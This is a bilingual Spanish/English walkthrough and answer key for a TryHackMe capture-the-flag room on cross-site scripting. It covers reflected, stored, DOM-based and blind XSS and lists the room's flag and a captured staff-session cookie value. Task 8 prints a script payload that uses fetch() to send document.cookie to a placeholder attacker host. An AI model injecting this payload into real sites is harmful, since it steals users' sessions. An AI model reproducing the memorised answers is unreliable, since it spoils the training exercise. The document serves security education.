# Intro to Cross-site Scripting

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | walkthrough | `introtocrosssitescripting` | https://tryhackme.com/room/introtocrosssitescripting | 01 Level Easy | TryHackMe | XSS payloads / reflected / stored / DOM Based / blind XSS / document.cookie / XSS Hunter Express | Dominar las cuatro variantes de Cross-site Scripting (reflejado, almacenado, DOM y ciego) y explotar un ejemplo práctico de blind XSS para robar la cookie de sesión. |

---

**Contexto:** La room cubre Cross-site Scripting (XSS) de forma integral: qué significa las siglas (Cross-Site Scripting), los payloads básicos (con **document.cookie** para el token de sesión y **alert** como prueba de concepto), y las variantes: **Reflected** (probado en parámetros de la URL), **Stored** (almacenado en la base de datos), **DOM Based** (buscando `eval()` en el código fuente) y **Blind** (con herramientas como XSS Hunter Express). Incluye un laboratorio de niveles para perfeccionar el payload hasta obtener una flag y un caso real de blind XSS donde se captura la cookie `staff-session`.

> **ES:** XSS desde cero: payloads, XSS reflejado, almacenado, basado en DOM y ciego; laboratorio de niveles y ejemplo práctico robando la cookie de sesión con blind XSS.
> **EN:** XSS from scratch: payloads, reflected, stored, DOM-based and blind XSS; level-based lab and a practical example stealing the session cookie via blind XSS.

## Solucionario

### Task 1: Room Brief / Resumen de la room

**Explicación:** Se introduce la room de XSS y sus objetivos de aprendizaje. XSS significa **Cross-Site Scripting**: una vulnerabilidad que permite inyectar y ejecutar scripts en el navegador de la víctima dentro del contexto de una página confiable.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What does XSS stand for? / ¿Qué significan las siglas XSS? | `Cross-Site Scripting` |

### Task 2: XSS Payloads / Payloads XSS

**Explicación:** Un payload XSS es el código JavaScript que se inyecta. La propiedad **document.cookie** del documento puede contener el token de sesión del usuario, lo que permite robar sesiones. Como prueba de concepto (PoC) se usa normalmente el método **alert()**, que muestra una ventana de alerta demostrando que el script se ejecutó.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Which document property could contain the user's session token? / ¿Qué propiedad del documento puede contener el token de sesión del usuario? | `document.cookie` |
| 2 | Which JavaScript method is often used as a Proof Of Concept? / ¿Qué método de JavaScript se usa a menudo como prueba de concepto? | `alert` |

### Task 3: Reflected XSS / XSS reflejado

**Explicación:** El XSS reflejado ocurre cuando el payload viaja en la petición y el servidor lo devuelve sin saneamiento en la respuesta. El mejor lugar para probarlo es en los **Parameters** (parámetros) de la URL, por ejemplo `https://site.com/search?q=<script>...`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Where in an URL is a good place to test for reflected XSS? / ¿Qué lugar de una URL es bueno para probar XSS reflejado? | `Parameters` |

### Task 4: Stored XSS / XSS almacenado

**Explicación:** El XSS almacenado (persistente) se guarda en el servidor y se sirve a todos los visitantes de la página. Los payloads suelen almacenarse en la **Database** (base de datos) del sitio, por ejemplo en comentarios o perfiles de usuario, de modo que cualquier usuario que cargue la página lo ejecuta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | How are stored XSS payloads usually stored on a website? / ¿Cómo se almacenan normalmente los payloads de XSS almacenado en un sitio web? | `Database` |

### Task 5: DOM Based XSS / XSS basado en DOM

**Explicación:** El XSS basado en DOM ocurre en el navegador, manipulando el Document Object Model sin que el servidor intervenga. En el código fuente conviene buscar métodos inseguros como **eval()**, que ejecuta cualquier cadena dentro del contexto de la página y es un punto de inyección clásico.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What unsafe JavaScript method is good to look for in source code? / ¿Qué método inseguro de JavaScript conviene buscar en el código fuente? | `eval()` |

### Task 6: Blind XSS / XSS ciego

**Explicación:** El XSS ciego es un tipo de XSS que impacta en una página que no vemos directamente (por ejemplo, el panel del administrador). Para detectarlo se usan herramientas como **XSS Hunter Express**, que capturan la ejecución aunque el exploit ocurra "a ciegas". El XSS ciego es muy similar al **Stored XSS**, porque también queda almacenado y se sirve a otro usuario (la víctima).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What tool can you use to test for Blind XSS? / ¿Qué herramienta puedes usar para probar XSS ciego? | `XSS Hunter Express` |
| 2 | What type of XSS is very similar to Blind XSS? / ¿Qué tipo de XSS es muy similar al XSS ciego? | `Stored XSS` |

### Task 7: Perfecting your payload / Perfeccionando tu payload

**Explicación:** Un laboratorio de varios niveles donde cada nivel tiene un filtro distinto (palabras clave, etiquetas, atributos) y hay que perfeccionar el payload para evadirlo. Superar el nivel seis entrega la flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag you received from level six? / ¿Cuál es la flag que recibiste del nivel seis? | `THM{XSS_MASTER}` |

### Task 8: Practical Example (Blind XSS) / Ejemplo práctico (XSS ciego)

**Explicación:** Caso real: el sitio tiene un panel de staff detrás de una página de contacto. Se inyecta un payload de blind XSS en el campo de comentario que, al ser revisado por el administrador, ejecuta un fetch de la cookie de sesión hacia un servidor controlado. La cookie capturada es la de sesión del staff.

```javascript
<script>fetch('https://ATTACKERIP/x?c='+encodeURIComponent(document.cookie))</script>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the value of the staff-session cookie? / ¿Cuál es el valor de la cookie staff-session? | `4AB305E55955197693F01D6F8FD2D321` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What does XSS stand for? | `Cross-Site Scripting` |
| 2 | Which document property could contain the user's session token? | `document.cookie` |
| 3 | Which JavaScript method is often used as a Proof Of Concept? | `alert` |
| 4 | Where in an URL is a good place to test for reflected XSS? | `Parameters` |
| 5 | How are stored XSS payloads usually stored on a website? | `Database` |
| 6 | What unsafe JavaScript method is good to look for in source code? | `eval()` |
| 7 | What tool can you use to test for Blind XSS? | `XSS Hunter Express` |
| 8 | What type of XSS is very similar to Blind XSS? | `Stored XSS` |
| 9 | What is the flag you received from level six? | `THM{XSS_MASTER}` |
| 10 | What is the value of the staff-session cookie? | `4AB305E55955197693F01D6F8FD2D321` |

---

**Metodología:** Del concepto al exploit real: (1) entender qué es XSS y los payloads base (document.cookie, alert); (2) clasificar las variantes según su vector: reflejado (parámetros de URL), almacenado (base de datos), DOM (`eval()`) y blind (XSS Hunter Express); (3) perfeccionar el payload en el laboratorio de filtros; (4) aplicar el blind XSS en el caso práctico para exfiltrar la cookie de sesión del staff.

### Cadena de ataque / Attack Chain

```text
Payload (document.cookie + alert) -> Reflected (URL params) / Stored (Database) / DOM (eval()) / Blind (XSS Hunter Express) -> lab de filtros -> payload perfeccionado -> fetch(document.cookie) -> capture staff-session cookie
```

**Learning chain:** Qué es XSS -> payloads -> reflejado -> almacenado -> DOM -> blind -> laboratorio -> exfiltración de cookie.

**Lección:** *XSS es un problema de confianza en el contexto: aunque la máquina parezca inaccesible, un solo clic de un admin sobre un payload ciego puede entregarte su sesión; el filtrado correcto de salida, no solo de entrada, es lo único que lo evita.*

**MITRE ATT&CK:** T1059.007 (Command and Scripting Interpreter: JavaScript), T1189 (Drive-by Compromise), T1566 (Phishing)

**Fuente:** [TryHackMe - Intro to Cross-site Scripting](https://tryhackme.com/room/introtocrosssitescripting)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.